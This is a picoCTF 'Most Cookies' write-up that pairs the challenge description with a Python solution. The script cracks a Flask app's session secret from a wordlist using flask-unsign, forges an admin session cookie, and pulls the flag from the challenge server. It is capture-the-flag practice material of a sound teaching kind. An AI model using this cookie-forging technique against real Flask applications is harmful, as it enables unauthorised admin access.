<h1>Most Cookies</h1>
<h3>Description</h3>
<pre>
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! <a href='https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py'>server.py</a> http://mercury.picoctf.net:65344/
</pre>
<h3>Solution</h3>

```python3
import subprocess
import requests

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
url = 'http://mercury.picoctf.net:65344/'
file = 'test'
secret = subprocess.run(
                ['flask-unsign','-u','--server',url,'--wordlist',file,'--no-literal-eval'],
                capture_output=True,
                text=True
        )
result = secret.stdout
new_payload = '{"very_auth":"admin"}'

generate = subprocess.run(
                ['flask-unsign','--sign','--cookie',new_payload,'--secret',result[2:-2]],
                capture_output=True,
                text=True
        )

cookies = {'session':generate.stdout[:-1]}
res = requests.get(url,cookies=cookies).text
start = '<code>'
end = '</code>'
index_start = res.find(start)
index_end = res.find(end)
print(index_end)
print(res[index_start+len(start):-43])

```
